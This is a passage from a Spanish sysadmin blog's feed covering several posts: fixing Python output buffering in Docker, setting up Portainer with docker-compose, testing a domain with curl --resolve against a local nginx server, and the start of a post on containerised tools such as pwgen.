&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utcnow&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strftime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que hace lo que se le supone. Sin embargo, el problema aparece al crear una imagen para su ejecución con &lt;strong&gt;docker&lt;/strong&gt;. Vamos a usar una imagen base de &lt;em&gt;DockerHub&lt;/em&gt; para mantener la dimensión del problema bajo control.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ cat Dockerfile 
FROM python:2-slim
COPY poll.py /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;poll.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras construir la imagen, vemos que no hay salida durante su ejecución:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ docker run --name poller -d poller
314d32b425d1d222527678fc15c73147162d62195c56422fc90729e9b4f6594b
gerard@aldebaran:~/docker/poller$ sleep &lt;span class="m"&gt;10&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ docker logs poller
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras 10 segundos de espera, el &lt;em&gt;script&lt;/em&gt; debería haber escrito unas 10 veces en la salida, y sin embargo no muestra nada.&lt;/p&gt;
&lt;h2&gt;La causa&lt;/h2&gt;
&lt;p&gt;Tras mucho esperar, me di cuenta de un factor interesante: tras varios minutos, se añadían muchas líneas en la salida, con sus &lt;em&gt;timestamps&lt;/em&gt; diferenciados entre sí por un segundo, más o menos.&lt;/p&gt;
&lt;p&gt;el primer pensamiento que viene en mi cabeza ante este comportamiento, es &lt;em&gt;buffering&lt;/em&gt;; no se trata de que la salida no sale, sino que sale en paquetes grandes, que se han ido acumulando en un &lt;em&gt;buffer&lt;/em&gt; para optimizar las escrituras a los dispositivos permanentes.&lt;/p&gt;
&lt;p&gt;Como esto no es aceptable para mi aplicación, intenté buscar en &lt;strong&gt;python&lt;/strong&gt; una respuesta satisfactoria, encontrándola en &lt;a href="https://docs.python.org/2/using/cmdline.html#cmdoption-u"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Parece ser que &lt;strong&gt;python&lt;/strong&gt; acepta una opción &lt;em&gt;-u&lt;/em&gt; en la línea de comandos, o una variable de entorno &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt; que elimina el comportamiento &lt;em&gt;buffereado&lt;/em&gt; de la salida estándar.&lt;/p&gt;
&lt;h2&gt;La solución&lt;/h2&gt;
&lt;p&gt;Sabiendo la causa del problema, la solución es todavía más simple: solo se trata de desactivar este comportamiento.&lt;/p&gt;
&lt;p&gt;Esto se consigue con alguna de las dos opciones siguientes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Podemos invocar el intérprete con el &lt;em&gt;flag -u&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Podemos hacer que el intérprete se ejecute en un entorno que defina la variable &lt;strong&gt;PYTHONUNBUFFERED&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Así pues, y tras modificar un poco nuestro &lt;em&gt;Dockerfile&lt;/em&gt;, el problema deja de existir.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ cat Dockerfile 
FROM python:2-slim
COPY poll.py /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;python&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-u&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;poll.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma podemos repetir el &lt;em&gt;test&lt;/em&gt; inicial, para demostrar que ya no nos ocurre de nuevo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/poller$ docker run --name poller -d poller
bb3bdaaf5ef92e2f38a70b30163abd335920aa940eb1327716eac3fa656ad651
gerard@aldebaran:~/docker/poller$ sleep &lt;span class="m"&gt;10&lt;/span&gt;
gerard@aldebaran:~/docker/poller$ docker logs poller
&lt;span class="m"&gt;13&lt;/span&gt;:24:08
&lt;span class="m"&gt;13&lt;/span&gt;:24:09
&lt;span class="m"&gt;13&lt;/span&gt;:24:10
&lt;span class="m"&gt;13&lt;/span&gt;:24:11
&lt;span class="m"&gt;13&lt;/span&gt;:24:12
&lt;span class="m"&gt;13&lt;/span&gt;:24:13
&lt;span class="m"&gt;13&lt;/span&gt;:24:14
&lt;span class="m"&gt;13&lt;/span&gt;:24:15
&lt;span class="m"&gt;13&lt;/span&gt;:24:16
&lt;span class="m"&gt;13&lt;/span&gt;:24:17
&lt;span class="m"&gt;13&lt;/span&gt;:24:18
&lt;span class="m"&gt;13&lt;/span&gt;:24:19
&lt;span class="m"&gt;13&lt;/span&gt;:24:20
&lt;span class="m"&gt;13&lt;/span&gt;:24:21
&lt;span class="m"&gt;13&lt;/span&gt;:24:22
gerard@aldebaran:~/docker/poller$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De hecho, el comportamiento es más evidente si vemos los &lt;em&gt;logs&lt;/em&gt; en modo &lt;em&gt;follow&lt;/em&gt;, o lo que es lo mismo, usando el &lt;em&gt;flag -f&lt;/em&gt;. Con él podemos ver como salta una traza cada segundo, de forma puntual y sin retardos.&lt;/p&gt;</content><category term="python"></category><category term="docker"></category><category term="buffering"></category><category term="logs"></category><category term="salida estándar"></category></entry><entry><title>Administrando Docker vía web: Portainer</title><link href="https://www.linuxsysadmin.ml/2017/04/administrando-docker-via-web-portainer.html" rel="alternate"></link><published>2017-04-24T10:00:00+02:00</published><updated>2017-04-24T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-24:/2017/04/administrando-docker-via-web-portainer.html</id><summary type="html">&lt;p&gt;El otro día me topé con un desarrollador que quiere desplegar sus contenedores &lt;strong&gt;Docker&lt;/strong&gt; en el servidor de integración, pero no conoce la sintaxis del comando &lt;em&gt;docker&lt;/em&gt; y prefiere una interfaz gráfica. Eso me llevó a investigar, buscando una opción bonita, funcional y ligera; al final, me topé con &lt;strong&gt;Portainer …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día me topé con un desarrollador que quiere desplegar sus contenedores &lt;strong&gt;Docker&lt;/strong&gt; en el servidor de integración, pero no conoce la sintaxis del comando &lt;em&gt;docker&lt;/em&gt; y prefiere una interfaz gráfica. Eso me llevó a investigar, buscando una opción bonita, funcional y ligera; al final, me topé con &lt;strong&gt;Portainer&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Podemos encontrar la imagen en &lt;strong&gt;DockerHub&lt;/strong&gt; en &lt;a href="https://hub.docker.com/r/portainer/portainer/"&gt;este link&lt;/a&gt;, así como una ligera descripción.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Portainer is a lightweight management UI which allows you to easily manage your Docker host or Swarm cluster.
Portainer is meant to be as simple to deploy as it is to use. It consists of a single container that can run on any Docker engine (Docker for Linux and Docker for Windows are supported).
Portainer allows you to manage your Docker containers, images, volumes, networks and more ! It is compatible with the standalone Docker engine and with Docker Swarm.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Instalación de portainer&lt;/h2&gt;
&lt;p&gt;Levantar el contenedor no tiene ningún misterio; basta con seguir las instrucciones de &lt;strong&gt;DockerHub&lt;/strong&gt; y las que nos pueda ofrecer la aplicación. Empezaremos haciendo un &lt;code&gt;docker pull portainer/portainer&lt;/code&gt;, para tener la imagen en local y maravillarnos de su ligereza: se trata solo de 10mb.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker$ docker images
REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
portainer/portainer   latest              1ad990af4145        &lt;span class="m"&gt;5&lt;/span&gt; hours ago         &lt;span class="m"&gt;9&lt;/span&gt;.96 MB
gerard@aldebaran:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mirando &lt;a href="http://portainer.io/install.html"&gt;la página web&lt;/a&gt;, vemos que levantar el contenedor no tiene ninguna dificultad; se trata de ejecutar la imagen tal cual, exponiendo el puerto 9000 a nuestra máquina &lt;em&gt;host&lt;/em&gt; de &lt;strong&gt;docker&lt;/strong&gt;, para su fácil acceso vía web. También le voy a dar un nombre de contenedor para su fácil administración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker$ docker run -d -p &lt;span class="m"&gt;9000&lt;/span&gt;:9000 --name portainer portainer/portainer
afcc57cfb1d0002d7e43cbdd5e6fcd0c6ada594eeac62132722e25cbb4569270
gerard@aldebaran:~/docker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Apuntando el navegador a la dirección IP del &lt;em&gt;host&lt;/em&gt;, con HTTP en el puerto 9000, vemos que ha levantado. La primera vez nos va a pedir una contraseña para el usuario &lt;em&gt;admin&lt;/em&gt;, así que la rellenamos. Lo siguiente es declarar el &lt;strong&gt;Docker Engine&lt;/strong&gt; o el &lt;strong&gt;Docker Swarm&lt;/strong&gt; que queramos controlar. Como yo quiero controlar mi &lt;strong&gt;Docker Engine&lt;/strong&gt; local, lo indico; y me salta una advertencia de que necesita el &lt;em&gt;unix socket&lt;/em&gt; de &lt;strong&gt;docker&lt;/strong&gt; mapeado en el contenedor.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On Linux and when using Docker for Mac or Docker for Windows or Docker Toolbox, ensure that you have started Portainer container with the following Docker flag -v "/var/run/docker.sock:/var/run/docker.sock"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Esto significa parar el contenedor y levantarlo de nuevo con el nuevo volumen. También significa que vamos a tener que introducir la contraseña para el usuario &lt;em&gt;admin&lt;/em&gt;. Mirando &lt;a href="https://portainer.readthedocs.io/en/stable/deployment.html#persist-portainer-data"&gt;la documentación&lt;/a&gt;, vemos que nos basta con poner la carpeta &lt;em&gt;/data/&lt;/em&gt; en un volumen del &lt;em&gt;host&lt;/em&gt; para persistir las configuraciones.&lt;/p&gt;
&lt;p&gt;Esto nos alarga la línea de comandos a ejecutar y empieza a ser tedioso de poner. Como siempre, &lt;strong&gt;docker-compose&lt;/strong&gt; al poder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  portainer:
    image: portainer/portainer
    container_name: portainer
    hostname: portainer
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./volumes/data:/data
    ports:
      - &lt;span class="s2"&gt;&amp;quot;9000:9000&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/portainer$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;portainer_default&amp;quot;&lt;/span&gt; with the default driver
Creating portainer
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras poner por última vez la contraseña del usuario &lt;em&gt;admin&lt;/em&gt; e indicar que queremos controlar la instancia local, ya tenemos la interfaz ejecutando.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Portainer dashboard" src="https://www.linuxsysadmin.ml/images/portainer-dashboard.jpg"&gt;&lt;/p&gt;
&lt;p&gt;En esta interfaz podremos lanzar todas las operaciones habituales cómodamente desde la web. Con ella podemos administrar las imágenes, los contenedores, las redes y los volúmenes.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: &lt;strong&gt;Portainer&lt;/strong&gt; no tiene ningún sistema de persistencia y los comandos son enviados desde el formulario directamente al demonio de &lt;strong&gt;Docker&lt;/strong&gt;; no se puede editar un contenedor creado, solo se puede recrearlo, de cero. Si os equivocáis, por ejemplo en una variable de entorno, no os queda más opción que recrear el contenedor entero.&lt;/p&gt;
&lt;h2&gt;Plantillas&lt;/h2&gt;
&lt;p&gt;Las plantillas son formas bonitas de levantar imágenes. Nos permiten elegir las plantillas con botones y luego nos dan un formulario prefabricado para rellenar variables de entorno. Nada más.&lt;/p&gt;
&lt;p&gt;Si usamos variables de entorno para configurar nuestros contenedores, son de gran ayuda. El conjunto básico de plantillas es muy limitado, pero se puede ampliar; nuevamente la respuesta está en &lt;a href="https://portainer.readthedocs.io/en/stable/templates.html"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Muy a &lt;em&gt;grosso&lt;/em&gt; modo, las plantillas disponibles se declaran en un fichero &lt;em&gt;templates.json&lt;/em&gt;, que se descarga remotamente y se indica su localización con el &lt;em&gt;docker command&lt;/em&gt; &lt;code&gt;--templates http://portainer-templates/templates.json&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Este fichero se puede servir con cualquier servidor web del que dispongamos, o si no tenemos uno, podemos construir una imagen con &lt;strong&gt;nginx&lt;/strong&gt;, por ejemplo. La documentación da detalles de como hacerlo.&lt;/p&gt;
&lt;p&gt;Yo mismo he creado mi propio contenedor &lt;strong&gt;nginx&lt;/strong&gt; para servir mi fichero de plantillas, con &lt;strong&gt;Alpine Linux&lt;/strong&gt;. No voy a poner como porque no es el &lt;em&gt;scope&lt;/em&gt; de este artículo, pero si voy a actualizar el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; para ver el resultado final.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  portainer:
    image: portainer/portainer
    container_name: portainer
    hostname: portainer
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - ./volumes/data:/data
    ports:
      - &lt;span class="s2"&gt;&amp;quot;9000:9000&amp;quot;&lt;/span&gt;
    command: --templates http://portainer-templates/templates.json
  portainer-templates:
    image: portainer-templates
    container_name: portainer-templates
    hostname: portainer-templates
    volumes:
      - ./volumes/templates/templates.json:/srv/www/templates.json:ro
gerard@aldebaran:~/docker/portainer$ docker-compose up -d
Creating portainer-templates
Creating portainer
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo queda crear un fichero con contenido adecuado de acuerdo a la documentación, que iremos actualizando a lo largo de la vida de nuestro proyecto. Solo voy a poner un &lt;em&gt;snippet&lt;/em&gt; del fichero para que os hagáis una idea de como es:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/portainer$ cat volumes/templates/templates.json 
&lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Kittens&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;A beautiful kitten listing&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;logo&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;https://s-media-cache-ak0.pinimg.com/736x/5d/bb/17/5dbb17d702b29b11f46d7a9c7ea53891.jpg&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;acme/kittens&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;env&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ENTORNO&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;label&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ENTORNO&amp;quot;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MONGO_URL&amp;quot;&lt;/span&gt;,
                &lt;span class="s2"&gt;&amp;quot;label&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MONGO_URL&amp;quot;&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MongoDB&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;MongoDB is a free and open-source cross-platform document-oriented database&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;logo&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;https://media.glassdoor.com/sqll/433703/mongodb-squarelogo-1407269491216.png&amp;quot;&lt;/span&gt;,
        &lt;span class="s2"&gt;&amp;quot;image&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;acme/mongo&amp;quot;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/portainer$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso dispondríamos de dos plantillas. La primera utiliza la imagen &lt;em&gt;acme/kittens&lt;/em&gt; y necesita dos variables de entorno. La segunda utiliza la imagen &lt;em&gt;acme/mongo&lt;/em&gt; y no necesita variables de entorno.&lt;/p&gt;</content><category term="docker"></category><category term="portainer"></category></entry><entry><title>Testear dominios sin tener el DNS con curl</title><link href="https://www.linuxsysadmin.ml/2017/04/testear-dominios-sin-tener-el-dns-con-curl.html" rel="alternate"></link><published>2017-04-17T00:00:00+02:00</published><updated>2017-04-17T00:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-17:/2017/04/testear-dominios-sin-tener-el-dns-con-curl.html</id><summary type="html">&lt;p&gt;En mi trabajo, los problemas llegan sin previo aviso. De repente, alguien te pone en aviso que su aplicación web está caída y es inaccesible. Se trata de un problema de resolución DNS, pero queremos probarlo para estar seguros de que solo es ese el problema y no es general …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En mi trabajo, los problemas llegan sin previo aviso. De repente, alguien te pone en aviso que su aplicación web está caída y es inaccesible. Se trata de un problema de resolución DNS, pero queremos probarlo para estar seguros de que solo es ese el problema y no es general.&lt;/p&gt;
&lt;p&gt;Lo primero que nos viene a la cabeza es montar un servidor DNS local e intentar acceder de nuevo, pero es mucho trabajo. Luego nos acordamos del fichero &lt;em&gt;/etc/hosts&lt;/em&gt;, pero no siempre es posible editarlo. Sin embargo, el comando &lt;strong&gt;curl&lt;/strong&gt; nos ofrece una opción para suplantar un dominio con la dirección IP que queramos.&lt;/p&gt;
&lt;h2&gt;Preparación&lt;/h2&gt;
&lt;p&gt;Vamos a crear un servidor web con contenido irrelevante solo para ver una demostración de como funciona esta opción. Para ello empezaremos instalando un servidor web cualquiera. Ya sabéis que me gusta mucho el &lt;strong&gt;nginx&lt;/strong&gt;...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# apt-get install -y nginx-light
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  nginx-common
Suggested packages:
  fcgiwrap nginx-doc ssl-cert
The following NEW packages will be installed:
  nginx-common nginx-light
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;2&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;2&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;421&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;1020&lt;/span&gt; kB of additional disk space will be used.
...
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a eliminar el &lt;em&gt;site&lt;/em&gt; que viene por defecto porque es un ejemplo y no es relevante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# unlink /etc/nginx/sites-enabled/default 
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Crearemos una carpeta para alojar el contenido web. Según la &lt;a href="https://es.wikipedia.org/wiki/Filesystem_Hierarchy_Standard"&gt;FHS&lt;/a&gt;, lo correcto es usar &lt;em&gt;/srv/www&lt;/em&gt;, que no viene en una distribución &lt;strong&gt;Debian&lt;/strong&gt; por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# mkdir /srv/www
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ponemos una página web cualquiera, solo para ver si llegamos o no a nuestro servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt; &amp;gt; /srv/www/index.html
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y vamos a crear un &lt;em&gt;site&lt;/em&gt; para que nuestro &lt;strong&gt;nginx&lt;/strong&gt; sepa lo que tiene que servir:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat /etc/nginx/sites-enabled/example 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Recargamos o reiniciamos el servidor web para que use la nueva configuración y listo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# service nginx reload
&lt;span class="o"&gt;[&lt;/span&gt; ok &lt;span class="o"&gt;]&lt;/span&gt; Reloading nginx configuration: nginx.
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora tenemos un servidor web normal y corriente en nuestro entorno.&lt;/p&gt;
&lt;h2&gt;Funcionamiento&lt;/h2&gt;
&lt;p&gt;Vamos ha hacer una petición a nuestro dominio. Voy a usar esta misma web por comodidad, pero si tenéis un dominio que no funciona por culpa del DNS, también lo podéis comprobar ahí.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -s http://www.linuxsysadmin.tk/ &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;&amp;lt;title&amp;gt;&amp;#39;&lt;/span&gt;
    &amp;lt;title&amp;gt;Linux Sysadmin&amp;lt;/title&amp;gt;
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Magnífico; esta es la web. Vamos ahora a pedirle a &lt;strong&gt;curl&lt;/strong&gt; que resuelva las peticiones a este mismo dominio y puerto 80 usando la dirección de nuestro servidor, con la opción &lt;em&gt;--resolve&lt;/em&gt;. Más información en las páginas &lt;strong&gt;man&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ curl -s --resolve www.linuxsysadmin.tk:80:172.18.0.2 http://www.linuxsysadmin.tk/
Hello World
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos que este comando ha pasado olímpicamente de lo que le decía el DNS y ha lanzado la petición a nuestro servidor, cuya dirección IP es 172.18.0.2, que es el que hemos preparado más arriba.&lt;/p&gt;
&lt;p&gt;Y con este truco tan simple pudimos comprobar que el problema era solo de DNS, ya que si lo evitamos con &lt;strong&gt;curl&lt;/strong&gt;, el resto funcionaba a la perfección.&lt;/p&gt;</content><category term="curl"></category><category term="dns"></category></entry><entry><title>Una toolbox empaquetada en contenedores</title><link href="https://www.linuxsysadmin.ml/2017/04/una-toolbox-empaquetada-en-contenedores.html" rel="alternate"></link><published>2017-04-10T10:00:00+02:00</published><updated>2017-04-10T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-04-10:/2017/04/una-toolbox-empaquetada-en-contenedores.html</id><summary type="html">&lt;p&gt;Muchas veces necesitamos herramientas para nuestro trabajo y no las usamos desde la misma máquina; otras veces no queremos instalar muchos paquetes en nuestra máquina. Tener una máquina virtual suele ser &lt;em&gt;overkill&lt;/em&gt; para ejecutar algunos binarios. En este caso podemos tener nuestras imágenes &lt;strong&gt;docker&lt;/strong&gt; listas para ser usadas según convenga …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces necesitamos herramientas para nuestro trabajo y no las usamos desde la misma máquina; otras veces no queremos instalar muchos paquetes en nuestra máquina. Tener una máquina virtual suele ser &lt;em&gt;overkill&lt;/em&gt; para ejecutar algunos binarios. En este caso podemos tener nuestras imágenes &lt;strong&gt;docker&lt;/strong&gt; listas para ser usadas según convenga.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a ver algunos ejemplos de imágenes de mi &lt;em&gt;toolbox&lt;/em&gt; como inspiración para otras, demostrando que podemos tener nuestras herramientas con una portabilidad máxima, y sin ocupar tanto espacio como nos podríamos imaginar; y lo mejor de todo: de usar y tirar, sin ensuciar nuestras distribuciones habituales.&lt;/p&gt;
&lt;h2&gt;Generando contraseñas&lt;/h2&gt;
&lt;p&gt;Creo que este es el peor ejemplo, ya que hay miles de webs que hacen esto mismo, pero cumple con la función didáctica. Hay un paquete en linux llamado &lt;strong&gt;pwgen&lt;/strong&gt; que nos ofrece el binario con el mismo nombre. Solo necesitamos un contenedor que invoque esta herramienta, escriba una contraseña aleatoria y se acabe, sin dejar nada instalado.&lt;/p&gt;
&lt;p&gt;Este paquete está disponible en &lt;strong&gt;Alpine Linux&lt;/strong&gt;, así que es muy fácil generar el contenedor con un tamaño adecuado. solamente necesitamos instalarlo y darle el comando base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@hermes:~/docker/tools$ cat pwgen/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache pwgen
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pwgen&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-cnyB&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;8&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@hermes:~/docker/tools$ 
&lt;/pre&gt;&lt;/div&gt;


